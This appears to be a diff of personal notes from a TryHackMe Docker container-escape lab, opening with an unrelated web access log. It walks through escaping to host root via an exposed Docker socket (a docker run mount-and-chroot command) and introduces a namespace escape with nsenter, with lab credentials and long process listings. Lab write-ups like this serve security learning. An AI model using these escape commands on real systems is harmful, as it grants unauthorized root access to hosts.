+GET /stylesheets/blockchain.css 304 0.741 ms - -
+GET /javascripts/lib/jquery.min.js 304 2.096 ms - -
+GET /javascripts/lib/bootstrap.min.js 304 2.530 ms - -
+GET /javascripts/lib/spin.min.js 304 6.548 ms - -
+GET /javascripts/lib/ladda.min.js 304 6.321 ms - -
+GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 7.152 ms - -
+GET /javascripts/blockchain.js 304 5.951 ms - -
+GET /javascripts/lib/sha256.js 304 4.411 ms - -
+GET /coinbase 304 500.725 ms - -
+GET /stylesheets/lib/bootstrap.min.css 304 1.610 ms - -
+GET /stylesheets/lib/bootstrap-theme.min.css 304 1.242 ms - -
+GET /stylesheets/lib/bootstrap-horizon.css 304 1.543 ms - -
+GET /stylesheets/lib/ladda-themeless.min.css 304 2.250 ms - -
+GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 1.204 ms - -
+GET /stylesheets/blockchain.css 304 1.279 ms - -
+GET /javascripts/lib/jquery.min.js 304 2.518 ms - -
+GET /javascripts/lib/bootstrap.min.js 304 1.337 ms - -
+GET /javascripts/lib/spin.min.js 304 1.090 ms - -
+GET /javascripts/lib/ladda.min.js 304 2.136 ms - -
+GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 2.336 ms - -
+GET /javascripts/lib/sha256.js 304 1.682 ms - -
+GET /javascripts/blockchain.js 304 1.270 ms - -
+```
+https://fosterelli.co/privilege-escalation-via-docker
+For this task, we're going to assume that we have managed to gain a foothold onto the container from something such as a vulnerable website running in a container.
+7.1. Step 1. Connecting to the container:
+Connect to your Instance using SSH with the following details:
+IP: 10.10.153.100
+SSH Port: 2233
+Username: danny
+Password: danny
+7.2. Looking for the exposed Docker socket
+Armed with the knowledge we've learnt about the Docker socket in "Vulnerability #4: RCE via Exposed Docker Daemon", we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with groups.
+![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock1.png)
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh danny@10.10.153.100 -p 2233 
+The authenticity of host '[10.10.153.100]:2233 ([10.10.153.100]:2233)' can't be established.
+ED25519 key fingerprint is SHA256:tBURDFD5bEwHNEuZrgMUboxGjjoQ3LwsXgHGAAnWMe0.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.153.100]:2233' (ED25519) to the list of known hosts.
+danny@10.10.153.100's password: 
+danny@3d8fe1db6635:~$ whoami
+danny
+danny@3d8fe1db6635:~$ groups
+danny docker
+danny@3d8fe1db6635:~$ cd /var/run
+danny@3d8fe1db6635:/var/run$ ls -la | grep sock
+srw-rw---- 1 root docker    0 Oct 26 00:42 docker.sock
+```
+7.3. Mount host volumes
+In the instance of this room, I have already downloaded the "alpine" image to the container that you are exploiting. In a THM room, you will most likely have to upload this image to the container before you can execute it, as Instances do not deploy with an internet connection.
+Now that we've confirmed we can execute Docker commands, let's mount the host directory to a new container and then connect to that to reveal all the data on the host OS! docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock2.png)
+Note: If you do not receive any output after 30 seconds you will need to cancel the command by "Ctrl + C" and attempt to run it again.
+We are essentially mounting the hosts "/" directory to the "/mnt" dir in a new container, chrooting and then connecting via a shell.
+7.4. Verify loot
+Success! We have a shell, let's verify who we're now connected as and enumerate around the file system.
+![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock3.png)
+```text
+danny@3d8fe1db6635:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+```text
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+```
+```text
+# ls /
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+```
+```text
+# groups
+root daemon bin sys adm disk uucp groups: cannot find name for group ID 11
+11 dialout tape sudo
+```
+```text
+# cd root
+```
+```text
+# ls
+```
+```text
+# ls -lah
+total 28K
+drwx------  4 root root 4.0K Nov 10  2020 .
+drwxr-xr-x 24 root root 4.0K Nov 12  2020 ..
+-rw-------  1 root root  406 Nov 13  2020 .bash_history
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4.0K Oct 24  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4.0K Nov 12  2020 .ssh
+```
+```text
+# cat authorized_keys
+```
+```text
+# cat known_hosts
+|1|/EHt5UUsnI9hqwcLMFA5TdvNtrs=|qihaDMUpcVI9fwvdha7PesRjel4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
+
+:)
+
+Escape Successful
+```
+8.1. Let's backpedal a little bit...
+I purposefully waited until this stage to show you exactly how Docker "isolates" containers from one another. Let's bring back our trusty diagram that demonstrates how containers run on the operating system.
+![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/docker-containers.png)
+```text
+3d8fe1db6635   container-socket       "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2233->22/tcp     brave_mendel 
+
+yep could connect thorugh ssh cz is open in port 2233
+```
+As you would have discovered during this room,  containers have networking capabilities and their own file storage...I mean we have previously used SSH to connect to the container into them and there were files present! They achieve this by using three components of the Linux kernel:
+Namespaces
+Cgroups
+OverlayFS
+But we're only going to be interested in namespaces here, after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files and memory away from other namespaces.
+Every process running on Linux will be assigned two things:
+A namespace
+A process identifier (PID)
+Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker for example, every new container will be running as a new namespace, although the container may be running multiple applications (and in turn, processes).
+Let's prove the concept of containerisation by comparing the number of processes there are in a Docker container that is running a webserver versus host operating system at the time:
+![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps1.png)
+Note some useful information highlighted in red. On the very left we can see system user the process is running as then the processes number. There are a few more columns that aren't worth explaining for this task. But notice in the last column, the command that is running. I've highlighted a Docker command running, and an instance of Google Chrome running. You can see I have a considerable amount of processes running.
+Let's list the processes running in our Docker container using ps aux It's important to note that we only have 6 processes running. This difference is a great indicator that we're in a container.
+![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps2.png)
+```text
+# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
+root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
+root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
+root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
+root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
+root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
+root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
+root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
+root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
+root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
+root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
+root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
+root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
+root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
+root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
+root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
+root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
+root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
+root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
+root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
+root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
+root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
+root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
+root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
+root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
+root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
+root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
+root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
+root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
+root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
+root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
+root       104  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:2]
+root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
+root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
+root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
+root       183  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/u4:3]
+root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
+root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
+root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
+root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
+root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
+root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
+root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
+root       430  0.0  0.8  94884 16964 ?        S<s  00:42   0:00 /lib/systemd/systemd
+root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
+root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
+root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
+root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
+root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
+root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
+root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
+root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
+root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
+root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
+root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
+root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
+62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
+systemd+   881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
+systemd+   922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
+daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
+syslog    1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
+root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
+root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
+root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
+message+  1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
+root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
+root      1097  0.0  0.8 169192 17104 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
+root      1111  0.0  1.3 931740 27984 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
+root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
+root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:04 /usr/bin/containerd
+root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
+root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1423  0.0  4.2 1401928 85740 ?       Ssl  00:42   0:01 /usr/bin/dockerd -H 
+root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1734  0.0  0.1 626836  3988 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1748  0.0  0.2 553104  4076 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1767  0.0  0.3 110132  6116 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1772  0.0  0.2 108724  5052 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1847  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1853  0.0  0.3  72304  6184 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1875  0.0  0.3  72304  6320 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1881  0.0  0.7 122768 15760 ?        Ssl  00:42   0:00 registry serve /etc/
+root      1894  0.0  0.8 122768 16616 ?        Ssl  00:42   0:00 registry serve /etc/
+root      2516  0.0  0.0      0     0 ?        I    00:56   0:00 [kworker/1:1]
+root      2540  0.0  0.3  72364  6572 ?        Ss   01:20   0:00 sshd: danny [priv]
+cmnatic   2544  0.0  0.1  72364  3352 ?        S    01:20   0:00 sshd: danny@pts/0
+cmnatic   2545  0.0  0.1  20256  3824 ?        Ss   01:20   0:00 -bash
+cmnatic   2564  0.0  2.9 928904 58672 ?        Sl+  01:23   0:00 docker run -v /:/mnt
+root      2583  0.0  0.3 108724  6056 ?        Sl   01:24   0:00 containerd-shim -nam
+root      2607  0.0  0.0   4628  1740 ?        Ss   01:24   0:00 sh
+root      2658  0.0  0.0      0     0 ?        I    01:24   0:00 [kworker/u4:0]
+root      2666  0.0  0.0      0     0 ?        I    01:30   0:00 [kworker/u4:1]
+root      2667  0.0  0.1  36700  3136 ?        R+   01:33   0:00 ps aux
+```
+```text
+# exit
+
+danny@3d8fe1db6635:/var/run$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root        26  0.0  0.3  72364  6572 ?        Ss   01:20   0:00 sshd: danny [priv]
+danny       28  0.0  0.1  72364  3352 ?        S    01:20   0:00 sshd: danny@pts/0
+danny       29  0.0  0.1  20256  3828 pts/0    Ss   01:20   0:00 -bash
+danny       56  0.0  0.1  36152  3160 pts/0    R+   01:36   0:00 ps aux
+```
+8.2. Here's why it matters to us:
+Put simply, the process with an ID of 0 is the process that is started when the system boots. Processes numbers increment and must be started by another process, so naturally, the next process ID will be #1. This process is the systems init , for example, the latest versions of Ubuntu use systemd. Any other process that runs will be controlled by systemd (process #1).
+We can use process #1's namespace on an operating system to escalate our privileges. Whilst containers are designed to use these namespaces to isolate from another, they can instead, coincide with the host computers processes, rather than isolated from...this gives us a nice opportunity to escape!
+8.3. Getting started
+This vulnerability generally relies on having root permissions to the container already so that the container is exposed to namespaces on the host.
+Connect to your Instance using SSH with the following details:
+New Instance IP: 10.10.153.100
+SSH Port: 2244
+Username: root
+Password: danny
+8.4. Our exploit here is simple...
+We can confirm that the container we're connected to in namespaces of the host by using ps aux. Remember how we were only expecting a couple of entries? Now we can see the whole systems process...
+![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/esc1.png)
+The exploit here is actually rather trivial, but I'll digress nonetheless. We'll be invoking the [nsenter](https://man7.org/linux/man-pages/man1/nsenter.1.html) command. To summarise, this command allows you to execute start processes and place them within the same namespace as another process.
+```text
+63b932f4d7d2   privileged-container   "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2244->22/tcp     musing_stonebraker
+
+now using port 2244
+root:danny
+
+──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh root@10.10.153.100 -p 2244
+The authenticity of host '[10.10.153.100]:2244 ([10.10.153.100]:2244)' can't be established.
+ED25519 key fingerprint is SHA256:TnK/teTwHzNhvysYkFqLCeP+Lvo4wGOytn/TA6VbNK0.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.153.100]:2244' (ED25519) to the list of known hosts.
+root@10.10.153.100's password: 
+Last login: Fri Nov 13 00:05:56 2020 from 172.17.0.1
+root@63b932f4d7d2:~# groups
+root
+root@63b932f4d7d2:~# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
+root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
+root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
+root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
+root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
+root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
+root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
+root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
+root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
+root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
+root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
+root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
+root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
+root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
+root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
+root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
+root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
+root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
+root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
+root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
+root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
+root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
+root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
+root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
+root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
+root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
+root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
+root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
+root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
+root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
+root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
+root       104  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:2]
+root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
+root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
+root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
+root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
+root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
+root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
+root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
+root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
+root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
+root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
+root       430  0.0  0.8  94884 16980 ?        S<s  00:42   0:00 /lib/systemd/systemd
+root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
+root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
+root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
+root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
+root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
+root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
+root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
+root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
+root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
+root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
+root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
+root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
+62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
+_apt       881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
+sshd       922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
+daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
+102       1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
+root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
+root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
+root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
+103       1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
+root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
+root      1097  0.0  0.8 169192 17112 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
+root      1111  0.0  1.4 931740 28932 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
+root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
+root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:04 /usr/bin/containerd
+root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
+root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1423  0.0  4.2 1401928 85800 ?       Ssl  00:42   0:02 /usr/bin/dockerd -H 
+root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
